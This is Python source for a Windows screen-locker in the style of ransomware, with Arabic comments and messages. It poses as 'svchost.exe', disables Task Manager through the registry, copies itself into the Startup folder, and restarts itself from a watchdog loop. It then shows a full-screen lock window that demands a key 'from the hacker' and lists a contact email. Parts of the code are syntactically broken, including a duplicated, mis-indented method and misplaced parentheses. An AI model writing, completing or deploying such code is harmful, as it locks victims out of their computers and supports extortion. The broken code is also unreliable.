#المكتبات
import tkinter as tk
from tkinter import messagebox
import winsound
from PIL import Image , ImageTk
import os
import sys
import shutil
import threading
from ctypes import windll
import winreg
import time
import psutil

class StealthModule:
    @staticmethod
    def apply_stealth_measures():
        # 1. تمويه العملية
        windll.kernel32.SetConsoleTitleW("svchost.exe")
        
        # 2. تعطيل Task Manager
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except Exception as e:
            pass

        # 3. مراقبة العملية
        @staticmethod
def _monitor_process():
    while True:
        if not StealthModule._is_process_running():
            try:
                os.startfile(sys.argv[0])  # يعيد تشغيل البرنامج
                os._exit(0)  # ينهي النسخة الحالية
            except:
                pass
        time.sleep(5)  # يتفحص كل 5 ثوانٍ

    @staticmethod
    def _monitor_process():
        while True:
            if not StealthModule._is_process_running():
                os.startfile(sys.argv[0])
                os._exit(0)
            time.sleep(5)

    @staticmethod
    def _is_process_running():
        current_process = os.path.basename(sys.argv[0])
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == current_process:
                return True
        return False

if __name__ == "__main__":
    StealthModule.apply_stealth_measures()

path_app =os.path.abspath(sys.argv[0])
run_start = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
name = os.path.join(run_start , "Oday.exe")
if not os.path.exists(name):
    shutil.copy(path_app , name)
root = tk.Tk()
def exit_app():
    root.destroy()
def clos():
    key="1234567"
    if entry.get() == key :
        exit_app()
    else:
        winsound.Beep(1000 , 5000)
        messagebox.showerror("لا تلعب معي!" , "المفتاح الذي تحاول إدخاله غير صحيح تواصل معى الهكر")
root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}")
root.overrideredirect(True)
root.attributes("-topmost" , True)
tk.Label(root , text="ادخل المفتاح الذي حصلت عليه من الهكر" , bg="red" , fg="white").pack()
entry = tk.Entry(root, width=50, bd=0)
entry.pack(pady=20)
b = tk.Button(root, text="الدخول إلى النظام", command=clos)
b.pack()
root.config(background="red")
image_path = "a.png"
img =Image.open(image_path)
photo = ImageTk.PhotoImage(img)
tk.Label(root , image=photo , borderwidth=0 , highlightthickness=0).pack()
tk.Label(root , text="hack@gmail.com" , bg="red" , fg="white").place(x=(root.winfo_screenwidth() //2 -50 , y=600))
threading.Thread(target=clos() , daemon=True).start()
root.resizable( False , False)
root.mainloop()
